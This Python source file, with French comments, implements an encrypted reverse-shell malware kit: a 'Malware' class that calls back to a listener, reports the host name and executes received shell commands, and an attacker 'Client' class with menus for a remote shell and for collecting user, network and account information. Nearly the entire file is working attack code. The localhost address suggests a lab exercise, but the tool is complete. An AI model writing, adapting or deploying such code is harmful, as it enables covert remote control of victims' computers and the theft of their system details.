import socket
import os
import sys
import time
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode

SERVER_ADDR = ("localhost", 60000)
LANGUAGE = "utf-8"
BUFFSIZE = 4096
KEY = b'AcVfgTjpKumnVftH'

"""
Classe contenant les fonctions pour la machine infectée
"""


class Malware:
    """Création du socket"""
    def __init__(self):
        try:
            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print("Socket cannot be created!")

    """Tentative de connection vers le serveur en boucle"""
    def start(self):
        try:
            print("try to co ....")
            self.my_socket.connect(SERVER_ADDR)
            self.send(os.environ["COMPUTERNAME"])
        except ConnectionRefusedError:
            time.sleep(2)
            self.start()
        except TimeoutError:
            time.sleep(4)
            self.start()
            
    """Envoi des messages (contient le chiffrement)"""
    def send(self, message):
        send_b = message.encode(LANGUAGE)
        iv = get_random_bytes(16)
        cipher = AES.new(KEY, AES.MODE_CFB, iv)
        encrypted = b64encode(iv + cipher.encrypt(send_b))
        self.my_socket.send(encrypted)

    """Reception des messages (contient le déchiffrement)"""
    def receive(self):
        try:
            enc = self.my_socket.recv(BUFFSIZE).decode(LANGUAGE)
            enc = b64decode(enc)
            iv = enc[:16]
            cipher = AES.new(KEY, AES.MODE_CFB, iv)
            return cipher.decrypt(enc[16:]).decode(LANGUAGE)
        except ConnectionResetError:
            self.quit()

    """Fermeture du socket"""
    def quit(self):
        time.sleep(3)
        self.my_socket.close()

    """Méthode permettant à la machine infectée de pouvoir exécuter la commande reçue et d'en renvoyer la réponse"""
    def rev_shell(self, cmd):
        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_byte = var.stdout.read() + var.stderr.read()
        out_str = out_byte.decode("utf-8", errors="replace")
        self.send(out_str)


"""
Classe contenant les fonction pour l'attaquant
"""


class Client:
    """Création d'un socket"""
    def __init__(self):
        try:
            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print("Socket cannot be created!")

    """Bind du socket avec l'addresse serveur suivit d'une écoute"""
    def start(self):
        try:
            self.my_socket.bind(SERVER_ADDR)
            self.my_socket.listen(1)
        except socket.error:
            print("Socket cant be binded!")
            self.quit_error()

    """Création de la connection si une machine essaye de se connecter à notre attaquant"""
    def conn(self):
        global distant_socket, addr, hostname
        distant_socket, addr = self.my_socket.accept()
        print("Connection accepted for :", addr)
        hostname = self.receive()
        print("The malware has infected the machine named " + str(hostname) + "\n")

    """Envoie d'une demande à travers le réseau (contient le chiffrement)"""
    def send(self, command):
        try:
            send_b = command.encode(LANGUAGE)
            iv = get_random_bytes(16)
            cipher = AES.new(KEY, AES.MODE_CFB, iv)
            encrypted = b64encode(iv + cipher.encrypt(send_b))
            distant_socket.send(encrypted)
        except ConnectionResetError:
            print("Connection lost with the infected machine")
            self.quit_error()

    """Reception des réponses de la machine infectée (contient le déchiffrement)"""
    def receive(self):
        enc = distant_socket.recv(BUFFSIZE).decode(LANGUAGE)
        enc = b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(KEY, AES.MODE_CFB, iv)
        return cipher.decrypt(enc[16:]).decode(LANGUAGE)

    """Méthode permettant à notre machine de se déconnecter"""
    def quit(self):
        print("Shutting down")
        distant_socket.close()
        self.my_socket.close()
        sys.exit()

    """Programme déconnectant notre attaquant dans le cas où la machine infectée serait éteinte"""
    def quit_error(self):
        print("Closing this session in 3 seconds.")
        time.sleep(1)
        print("... 2")
        time.sleep(1)
        print(".. 1")
        time.sleep(1)
        self.my_socket.close()
        sys.exit()

    """Méthode affichant le menu principal"""
    def main_menu(self):
        print("                   _                                   \n",
              "      /\\/\\   __ _(_)_ __     /\\/\\   ___ _ __  _   _ \n",
              "     /    \\ / _` | | \'_ \\   /    \\ / _ \\ \'_ \\| | | |\n",
              "    / /\\/\\ \\ (_| | | | | | / /\\/\\ \\  __/ | | | |_| |\n",
              "    \\/    \\/\\__,_|_|_| |_| \\/    \\/\\___|_| |_|\\__,_|\n",
              "                                                    \n")
        print("Press 1 to access the remote shell")
        print("Press 2 to get informations")
        print("Press 0 to quit")
        choice = input()
        return choice

    """Méthode affichant notre menu get information et retournant le choix de l'attaquant"""
    def display_choice(self):
        print("   _____        __                                 \n",
              "  \\_   \\_ __  / _| ___     /\\/\\   ___ _ __  _   _ \n",
              "   / /\\/ \'_ \\| |_ / _ \\   /    \\ / _ \\ \'_ \\| | | |\n",
              "/\\/ /_ | | | |  _| (_) | / /\\/\\ \\  __/ | | | |_| |\n",
              "\\____/ |_| |_|_|  \\___/  \\/    \\/\\___|_| |_|\\__,_|\n")
        print("Press 1 to get the infected computer name")
        print("Press 2 to see who is the current user")
        print("Press 3 to get the network configuration")
        print("Press 4 to get the list of users")
        print("Press 5 to return to the main menu")
        print("Press 0 to quit")
        return input()

    """Méthode utilisée pour envoyer la bonne demande à la machine infectée (dans le cas du get information)"""
    def choice_information(self, choice2):
        while choice2 != "0" and choice2 != "5" and choice2 is not None:
            if choice2 == "1":
                self.send("computer")
                print("\nComputer name : ", end="")
                print(self.receive())
            elif choice2 == "2":
                self.send("current")
                print("\nCurrent user : ", end="")
                print(self.receive())
            elif choice2 == "3":
                self.send("network")
                print(self.receive())
            elif choice2 == "4":
                self.send("users")
                print(self.receive())
            else:
                print("Enter a valid value!\n")

            choice2 = self.display_choice()

        if choice2 == "5":
            self.send("menu")
        else:
            self.send("quit")
            self.quit()

    """Méthode utilisée pour envoyer la bonne demande à la machine infectée lors de l'utilisation du module argparse"""
    def info_arg(self, argument):
        self.send(argument)
        print(self.receive())
        self.send("quit")
        self.quit()
